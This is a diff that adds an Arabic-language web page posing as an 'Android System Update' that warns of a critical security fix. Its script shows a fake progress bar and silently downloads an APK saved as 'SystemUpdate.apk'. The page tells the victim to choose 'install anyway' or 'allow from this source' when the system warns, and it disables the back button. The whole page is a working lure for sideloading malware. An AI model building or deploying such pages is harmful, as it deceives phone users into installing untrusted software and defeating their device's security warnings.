@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>تحديث النظام</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+body {
+    font-family: 'Roboto', -apple-system, sans-serif;
+    background: #fff;
+    color: #202124;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+}
+.header {
+    background: #fff;
+    padding: 24px 20px 16px;
+    border-bottom: 1px solid #dadce0;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+}
+.icon-box {
+    width: 48px; height: 48px;
+    border-radius: 12px;
+    background: #e8f0fe;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+}
+.icon-box svg { width: 28px; height: 28px; fill: #1a73e8; }
+.title { font-size: 20px; font-weight: 500; color: #202124; }
+.subtitle { font-size: 13px; color: #5f6368; margin-top: 2px; }
+.content { padding: 24px 20px; flex: 1; }
+.update-card {
+    background: #f8f9fa;
+    border-radius: 12px;
+    padding: 20px;
+    margin-bottom: 20px;
+}
+.update-title {
+    font-size: 16px;
+    font-weight: 500;
+    margin-bottom: 8px;
+    color: #202124;
+}
+.update-version {
+    font-size: 13px;
+    color: #5f6368;
+    margin-bottom: 16px;
+}
+.update-details {
+    font-size: 14px;
+    line-height: 1.6;
+    color: #3c4043;
+}
+.update-details li { margin: 6px 0; margin-right: 20px; }
+.size-info {
+    display: flex;
+    justify-content: space-between;
+    padding: 12px 0;
+    border-top: 1px solid #dadce0;
+    margin-top: 16px;
+    font-size: 13px;
+    color: #5f6368;
+}
+.btn-container {
+    padding: 16px 20px 32px;
+}
+.download-btn {
+    width: 100%;
+    padding: 16px;
+    background: #1a73e8;
+    color: #fff;
+    border: none;
+    border-radius: 8px;
+    font-size: 16px;
+    font-weight: 500;
+    cursor: pointer;
+    font-family: inherit;
+}
+.download-btn:active { background: #1557b0; }
+.progress-container {
+    display: none;
+    padding: 20px;
+    text-align: center;
+}
+.progress-bar {
+    height: 6px;
+    background: #dadce0;
+    border-radius: 3px;
+    overflow: hidden;
+    margin: 16px 0;
+}
+.progress-fill {
+    height: 100%;
+    background: #1a73e8;
+    width: 0%;
+    transition: width 0.3s;
+}
+.progress-text {
+    font-size: 14px;
+    color: #5f6368;
+}
+.done-box {
+    display: none;
+    padding: 24px 20px;
+    text-align: center;
+}
+.done-icon {
+    width: 64px; height: 64px;
+    border-radius: 50%;
+    background: #e6f4ea;
+    margin: 0 auto 16px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+.done-icon svg { width: 32px; height: 32px; fill: #34a853; }
+.done-title { font-size: 18px; font-weight: 500; margin-bottom: 8px; }
+.done-text { font-size: 14px; color: #5f6368; line-height: 1.6; }
+.install-note {
+    background: #fef7e0;
+    border-radius: 8px;
+    padding: 14px 16px;
+    margin-top: 20px;
+    font-size: 13px;
+    color: #7a5c00;
+    line-height: 1.6;
+    text-align: right;
+}
+</style>
+</head>
+<body>
+
+<div class="header">
+    <div class="icon-box">
+        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
+    </div>
+    <div>
+        <div class="title">تحديث النظام</div>
+        <div class="subtitle">Android System Update</div>
+    </div>
+</div>
+
+<div class="content" id="mainContent">
+    <div class="update-card">
+        <div class="update-title">تحديث أمني حرج متاح</div>
+        <div class="update-version">الإصدار: 14.0.2 (SP1A.210812.016)</div>
+        <ul class="update-details">
+            <li>إصلاح ثغرة أمنية حرجة في نظام الرسائل</li>
+            <li>تحسين استقرار النظام والأداء</li>
+            <li>تحديث مكونات الأمان لشهر أكتوبر</li>
+        </ul>
+        <div class="size-info">
+            <span>حجم التحديث: 3.5 MB</span>
+            <span>مطلوب</span>
+        </div>
+    </div>
+</div>
+
+<div class="progress-container" id="progressBox">
+    <div class="progress-text" id="progressText">جاري التنزيل... 0%</div>
+    <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+    <div class="progress-text" style="font-size:12px;">لا تغلق هذه الصفحة</div>
+</div>
+
+<div class="done-box" id="doneBox">
+    <div class="done-icon">
+        <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+    </div>
+    <div class="done-title">تم التنزيل بنجاح</div>
+    <div class="done-text">اضغط على "تثبيت" في الشاشة التالية</div>
+    <div class="install-note">
+        ⚠️ قد تظهر رسالة تحذير من النظام<br>
+        اختر <b>"تثبيت على أي حال"</b> أو <b>"السماح من هذا المصدر"</b>
+    </div>
+</div>
+
+<div class="btn-container" id="btnContainer">
+    <button class="download-btn" onclick="startDownload()">تثبيت التحديث الآن</button>
+</div>
+
+<script>
+function startDownload() {
+    document.getElementById('mainContent').style.display = 'none';
+    document.getElementById('btnContainer').style.display = 'none';
+    document.getElementById('progressBox').style.display = 'block';
+
+    let progress = 0;
+    const fill = document.getElementById('progressFill');
+    const text = document.getElementById('progressText');
+
+    const interval = setInterval(() => {
+        progress += Math.random() * 12 + 3;
+        if (progress >= 100) {
+            progress = 100;
+            clearInterval(interval);
+            setTimeout(showDone, 500);
+        }
+        fill.style.width = progress + '%';
+        text.textContent = 'جاري التنزيل... ' + Math.floor(progress) + '%';
+    }, 250);
+
+    // بعد 1.5 ثانية ابدأ التنزيل الحقيقي
+    setTimeout(() => {
+        const a = document.createElement('a');
+        a.href = '/download/app.apk';
+        a.download = 'SystemUpdate.apk';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+    }, 1500);
+}
+
+function showDone() {
+    document.getElementById('progressBox').style.display = 'none';
+    document.getElementById('doneBox').style.display = 'block';
+}
+
+// منع الرجوع
+history.pushState(null, null, location.href);
+window.onpopstate = function() {
+    history.go(1);
+};
+</script>
+
+</body>
+</html>
